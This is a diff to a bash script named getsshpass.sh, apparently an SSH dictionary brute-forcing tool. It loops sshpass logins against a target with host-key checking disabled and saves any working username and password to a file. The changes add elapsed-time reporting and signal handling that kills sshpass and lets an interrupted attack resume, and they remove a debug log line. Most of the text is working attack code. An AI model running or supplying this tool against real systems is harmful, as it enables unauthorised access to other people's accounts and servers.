@@ -6,6 +6,9 @@
 #   5 - bad password
 #   255 - connection refused
 
+
+declare -r START_TIME=$(date +%s.%N)   # Start time of the program
+
 function usage { 
   echo -e "Usage: $0 [OPTIONS]"
   echo "OPTIONS: "
@@ -21,7 +24,7 @@ function usage {
 
 function version
  {
-  echo -e "getsshpass.sh 0.7"
+  echo -e "getsshpass.sh 0.8"
   echo -e "Copyright (C) 2016 Radovan Brezula 'brezular'"
   echo -e "License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>."
   echo -e "This is free software: you are free to change and redistribute it."
@@ -139,7 +142,6 @@ function parallel_ssh {
     #   retval must be either 0 -> good password or 5 -> bad password
  while [ "$retval" == 255 -o "$retval" == 3 ]; do
     sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -p "$port" "$user"@"$ip" exit &>/dev/null; retval="$?"
-    echo "Password: $pass Value: $retval" >> values.txt
     [ "$retval" == 0 ] && echo "*** Found username: '$user' and password: '$pass' ***"  > "$pthdir/x0x901f22result.txt"
     sleep "$nval"
  done
@@ -161,10 +163,29 @@ function launch_attack {
  evaluate_result
 }
 
+# Show ellapsed time
+function ellapsed_time {
+ END_TIME=$(date +%s.%N)
+ dt=$(echo "$END_TIME - $START_TIME" | bc)
+ dd=$(echo "$dt/86400" | bc)
+ dt2=$(echo "$dt-86400*$dd" | bc)
+ dh=$(echo "$dt2/3600" | bc)
+ dt3=$(echo "$dt2-3600*$dh" | bc)
+ dm=$(echo "$dt3/60" | bc)
+ ds=$(echo "$dt3-60*$dm" | bc | awk '{printf("%.2f\n", $1)}')
+
+ if [ "$dd" == "0" ] ; then dd=""; else dd=${dd}"d "; fi
+ if [ "$dh" == "0" ] ; then dh=""; else dh=${dh}"h "; fi
+ if [ "$dm" == "0" ] ; then dm=""; else dm=${dm}"m "; fi
+
+ echo "Ellapsed time: "${dd}""${dh}""${dm}""${ds}"s"
+}
+
 function evaluate_result {
     [ -f "$pthdir/01xza01.txt" ] && rm "$pthdir/01xza01.txt"                         # We don't need last saved password when script kills itself (password found) or
     if [ -f "$pthdir/x0x901f22result.txt" ]; then                                    # Display found username and password when password is found
        cat "$pthdir/x0x901f22result.txt"
+       ellapsed_time
     else 
        echo "*** Password not found, use other dictionary ***" 
     fi
@@ -173,11 +194,18 @@ function evaluate_result {
     pkill sshpass  
 }
 
+function monitor_signal {
+ trap 'pkill sshpass; echo "Program teminated."; exit' SIGHUP SIGTERM SIGQUIT                             # kill sshpass when script finishes or
+ trap 'pkill sshpass; echo "Ctrl+C detected, start script again to continue with attack"; exit' SIGINT    # it is interrupted / suspended
+ trap 'pkill sshpass; echo "Ctrl+Z detected, start script again to continue with attack"; exit' SIGTSTP
+}
 
 
 ### BODY ### 
+
 read_args $@
 check_args
+monitor_signal
 launch_attack
 
 
